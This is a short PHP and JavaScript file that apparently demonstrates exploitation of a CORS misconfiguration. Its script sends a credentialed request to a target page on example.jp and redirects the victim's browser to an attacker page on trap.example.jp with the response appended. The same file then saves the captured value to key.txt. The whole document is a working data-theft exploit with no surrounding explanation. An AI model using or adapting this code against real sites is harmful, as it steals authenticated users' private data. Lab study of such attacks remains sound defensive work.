<?php

$key = $_GET['key'];

if(!is_null($key)){
	$myfile = fopen("key.txt", "w") or die("Unable to open file!");
	fwrite($myfile, $key);
	fclose($myfile);
}else{
?>

<script>

var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','http://example.jp/cors-misconfiguration/index.php',true); 
req.withCredentials = true; // add origin header
req.send();

function reqListener() {
    location='http://trap.example.jp/cors-misconfiguration/hacker.php?key='+this.responseText; 
};
		
</script>
<?
		 }
	?>